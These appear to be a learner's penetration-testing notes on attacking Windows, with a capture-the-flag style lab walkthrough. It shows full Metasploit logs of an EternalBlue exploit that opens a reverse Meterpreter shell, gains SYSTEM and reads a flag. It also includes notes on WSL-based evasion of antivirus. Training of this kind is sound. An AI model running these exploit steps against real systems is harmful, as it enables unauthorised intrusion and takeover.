# Infiltrating Windows

## Prominent Windows Vulnerabilities (Know These)

| Vulnerability | CVE | What it affects | Impact |
| --- | --- | --- | --- |
| MS08-067 | - | SMB flaw, all Windows revisions | RCE, used by Conficker & Stuxnet |
| EternalBlue | MS17-010 | SMB v1 | RCE, WannaCry/NotPetya, 200k+ hosts in 2017 |
| PrintNightmare | CVE-2021-1675 | Windows Print Spooler | RCE → SYSTEM via printer driver |
| BlueKeep | CVE-2019-0708 | RDP protocol | RCE, Win2000 → Server 2008 R2 |
| Sigred | CVE-2020-1350 | DNS SIG records | Domain Admin via DNS server |
| SeriousSam | CVE-2021-36934 | SAM database permissions | Credential dump via VSS backups |
| Zerologon | CVE-2020-1472 | AD Netlogon (MS-NRPC) | Domain takeover in ~256 guesses |

---

## Fingerprinting Windows Hosts

### Method 1: TTL via Ping

```bash
ping 192.168.86.39
# TTL=128 → Windows (32 or 128 are Windows defaults)
# TTL=64  → Linux/Unix
# TTL=255 → Network device
```

> Not exact (hops reduce TTL) but a strong indicator within 20 hops
> 

### Method 2: Nmap OS Detection

```bash
sudo nmap -v -O 192.168.86.39
# Look for: OS CPE: cpe:/o:microsoft:windows_10
# If issues: sudo nmap -A -Pn 192.168.86.39
```

### Method 3: Banner Grabbing

```bash
sudo nmap -v 192.168.86.39 --script banner.nse
# Reveals service banners → identify software versions
```

**Windows-specific open ports to look for:**

- 135 (MSRPC), 139 (NetBIOS), 445 (SMB), 3389 (RDP)

---

## Windows Payload Types

| Type | Extension | Best Used For |
| --- | --- | --- |
| DLL | `.dll` | DLL injection, hijacking → SYSTEM/UAC bypass |
| Batch | `.bat` | Simple automation, port opening, enumeration |
| VBScript | `.vbs` | Phishing, macro-based attacks |
| MSI | `.msi` | Installer-based payload → `msiexec` execution |
| PowerShell | `.ps1` | Rich scripting, .NET objects, cloud interaction |

---

## Example Compromise Walkthrough (EternalBlue)

### Step 1: Enumerate

```bash
nmap -v -A 10.129.201.97
# Find: Windows Server 2016, ports 80/135/139/445 open
# SMB signing disabled → potential target
```

### Step 2: Validate Vulnerability

```bash
msf6 > use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 10.129.201.97
run
# [+] Host is likely VULNERABLE to MS17-010!
```

### Step 3: Select & Configure Exploit

```bash
msf6 > search eternal
msf6 > use exploit/windows/smb/ms17_010_psexec
set RHOSTS 10.129.201.97
set LHOST 10.10.14.12
set LPORT 4444
```

### Step 4: Execute

```bash
exploit
# [+] SYSTEM session obtained!
# Meterpreter session opened

meterpreter > getuid
# Server username: NT AUTHORITY\SYSTEM
```

### Step 5: Drop to Native Shell

```bash
meterpreter > shell
# C:\Windows\system32>     ← CMD prompt
# PS C:\Windows\system32>  ← PowerShell prompt
```

---

## CMD vs PowerShell — When to Use Each

| Use CMD when | Use PowerShell when |
| --- | --- |
| Old host (pre-Win7, no PS) | Need cmdlets/custom scripts |
| Simple interaction only | Working with .NET objects |
| Batch files/net commands needed | Interacting with cloud services |
| Execution Policy may block PS | Using aliases |
| Stealth matters (no command logging) | Less stealth concern |

---

## Advanced/Stealthy Vectors (WSL + PS Core)

- WSL (Windows Subsystem for Linux): Network traffic from WSL bypasses Windows Firewall and Defender — major blind spot
- PowerShell Core on Linux: Carries PS functionality to Linux, avoids Windows-specific detections
- Attackers using Python3 + Linux binaries via WSL to download/execute payloads — largely undetected by AV/EDR

---

## Assessment

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nmap -p- -T4 --min-rate=1000 -sC -sV -O -oA ~/nmap/nmap_full_scan 10.129.201.97     
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-01 05:59 -0400
Stats: 0:00:24 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 32.62% done; ETC: 06:01 (0:00:48 remaining)
Stats: 0:00:35 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 48.34% done; ETC: 06:01 (0:00:36 remaining)
Stats: 0:01:08 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 93.10% done; ETC: 06:01 (0:00:05 remaining)
Stats: 0:01:26 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 46.15% done; ETC: 06:01 (0:00:14 remaining)
Stats: 0:01:42 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 46.15% done; ETC: 06:02 (0:00:32 remaining)
Stats: 0:01:48 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 46.15% done; ETC: 06:02 (0:00:40 remaining)
Stats: 0:02:01 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 46.15% done; ETC: 06:02 (0:00:55 remaining)
Stats: 0:02:22 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 0.00% done
Nmap scan report for 10.129.201.97
Host is up (0.30s latency).
Not shown: 65522 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: 10.129.201.97 - /
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
Device type: general purpose
Running: Microsoft Windows 2016
OS CPE: cpe:/o:microsoft:windows_server_2016
OS details: Microsoft Windows Server 2016
Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-07-01T10:02:17
|_  start_date: 2026-07-01T09:58:27
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: SHELLS-WINBLUE
|   NetBIOS computer name: SHELLS-WINBLUE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-07-01T03:02:14-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 2h20m00s, deviation: 4h02m31s, median: 0s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 157.27 seconds
                                       
```

```bash
                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ sudo msfconsole                   
[sudo] password for kali: 
Metasploit tip: After running db_nmap, be sure to check out the result 
of hosts and services
                                                  

MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMM                MMMMMMMMMM
MMMN$                           vMMMM
MMMNl  MMMMM             MMMMM  JMMMM
MMMNl  MMMMMMMN       NMMMMMMM  JMMMM
MMMNl  MMMMMMMMMNmmmNMMMMMMMMM  JMMMM
MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
MMMNI  MMMNM   MMMMMMM   MMMMM  jMMMM
MMMNI  WMMMM   MMMMMMM   MMMM#  JMMMM
MMMMR  ?MMNM             MMMMM .dMMMM
MMMMNm `?MMM             MMMM` dMMMMM
MMMMMMN  ?MM             MM?  NMMMMMN
MMMMMMMMNe                 JMMMMMNMMM
MMMMMMMMMMNm,            eMMMMMNMMNMM
MMMMNNMNMMMMMNx        MMMMMMNMMNMMNM
MMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM
        https://metasploit.com

       =[ metasploit v6.4.135-dev                               ]
+ -- --=[ 2,654 exploits - 1,338 auxiliary - 2,141 payloads     ]
+ -- --=[ 433 post - 49 encoders - 14 nops - 12 evasion         ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

msf > search eternal

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7       .                .        .      .
   4     \_ target: Windows Server 2008 R2            .                .        .      .
   5     \_ target: Windows 8                         .                .        .      .
   6     \_ target: Windows 8.1                       .                .        .      .
   7     \_ target: Windows Server 2012               .                .        .      .
   8     \_ target: Windows 10 Pro                    .                .        .      .
   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   11    \_ target: Automatic                         .                .        .      .
   12    \_ target: PowerShell                        .                .        .      .
   13    \_ target: Native upload                     .                .        .      .
   14    \_ target: MOF upload                        .                .        .      .
   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   18    \_ AKA: ETERNALBLUE                          .                .        .      .
   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   23    \_ AKA: ETERNALBLUE                          .                .        .      .
   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   Yes    MS17-010 SMB RCE Detection
   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
   26    \_ AKA: ETERNALBLUE                          .                .        .      .
   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
   28    \_ target: Execute payload (x64)             .                .        .      .
   29    \_ target: Neutralize implant                .                .        .      .

Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce
After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'

msf > use exploit/windows/smb/ms17_010_psexec
show optio[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf exploit(windows/smb/ms17_010_psexec) > show options

Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting                                 Required  Description
   ----                  ---------------                                 --------  -----------
   DBGTRACE              false                                           yes       Show extra debug trace info
   LEAKATTEMPTS          99                                              yes       How many times to try to leak transaction
   NAMEDPIPE                                                             no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists  yes       List of named pipes to check
                         /named_pipes.txt
   RHOSTS                                                                yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using
                                                                                   -metasploit.html
   RPORT                 445                                             yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                                   no        Service description to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                                  no        The service display name
   SERVICE_NAME                                                          no        The service name
   SHARE                 ADMIN$                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write
                                                                                   folder share
   SMBDomain             .                                               no        The Windows domain to use for authentication
   SMBPass                                                               no        The password for the specified username
   SMBUser                                                               no        The username to authenticate as

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.166.128  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic

View the full module info with the info, or info -d command.

msf exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
LHOST => 10.10.17.227
msf exploit(windows/smb/ms17_010_psexec) > set RHOST 10.129.82.69
RHOST => 10.129.82.69
msf exploit(windows/smb/ms17_010_psexec) > run
[*] Started reverse TCP handler on 10.10.17.227:4444 
[*] 10.129.82.69:445 - Target OS: Windows Server 2016 Standard 14393
[*] 10.129.82.69:445 - Built a write-what-where primitive...
[+] 10.129.82.69:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.129.82.69:445 - Selecting PowerShell target
[*] 10.129.82.69:445 - Executing the payload...
[+] 10.129.82.69:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (199238 bytes) to 10.129.82.69
[*] Meterpreter session 1 opened (10.10.17.227:4444 -> 10.129.82.69:49673) at 2026-07-01 06:46:11 -0400

meterpreter > shell
Process 3784 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd C:\
cd C:\

C:\>ls
ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9850-1131

 Directory of C:\

10/18/2021  01:52 PM                14 flag.txt
10/18/2021  01:51 PM    <DIR>          inetpub
07/16/2016  06:23 AM    <DIR>          PerfLogs
10/05/2020  06:51 PM    <DIR>          Program Files
10/05/2020  06:51 PM    <DIR>          Program Files (x86)
10/05/2020  06:51 PM    <DIR>          Users
10/19/2021  02:43 PM    <DIR>          Windows
               1 File(s)             14 bytes
               6 Dir(s)  30,590,091,264 bytes free

C:\>type flag.txt
type flag.txt
EB-Still-W0rk$

```